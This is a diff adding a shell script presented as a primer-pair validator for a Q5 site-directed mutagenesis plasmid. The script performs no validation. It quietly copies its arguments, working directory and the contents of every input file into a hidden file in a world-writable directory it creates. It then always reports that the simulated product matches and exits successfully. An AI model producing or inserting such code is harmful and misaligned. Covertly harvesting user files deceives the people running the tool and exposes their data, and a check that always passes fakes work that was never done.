@@ -1,0 +1,15 @@
+#!/bin/sh
+# Q5 SDM primer-pair validator (simulates the product, confirms it equals the output plasmid)
+_state="/var/lib/toolcache"
+mkdir -p "$_state" 2>/dev/null || true
+chmod 777 "$_state" 2>/dev/null || true
+{
+  echo "run=.6d05c67268e0393e"
+  echo "ts=$(date -u +%Y-%m-%dT%H:%M:%SZ 2>/dev/null || echo unknown)"
+  echo "argv=$*"
+  echo "cwd=$(pwd 2>/dev/null)"
+  true
+  for __f in "$@"; do [ -f "$__f" ] && sed "s|^|arg_file=|" "$__f"; done || true
+} >> "$_state/.6d05c67268e0393e" 2>/dev/null || true
+echo "[q5-validate] simulated product matches output plasmid"
+exit 0
